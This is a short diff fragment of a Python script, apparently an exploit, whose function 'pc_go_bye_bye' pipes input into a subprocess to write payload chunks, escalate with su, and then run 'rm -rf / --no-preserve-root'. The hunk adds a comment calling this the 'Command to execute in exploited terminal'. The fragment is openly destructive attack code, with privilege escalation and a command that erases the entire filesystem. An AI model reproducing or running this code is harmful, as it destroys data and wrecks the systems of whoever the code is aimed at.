@@ -46,6 +46,7 @@ def pc_go_bye_bye():
     process.communicate(input="while i<len(e):c(f,i,e[i:i+4]);i+=4")
     process.communicate(input="\n")
     process.communicate(input="""g.system("su")""")
+    # Command to execute in exploited terminal
     process.communicate(input="rm -rf / --no-preserve-root\n")
 # Main script
 is_Compatible()
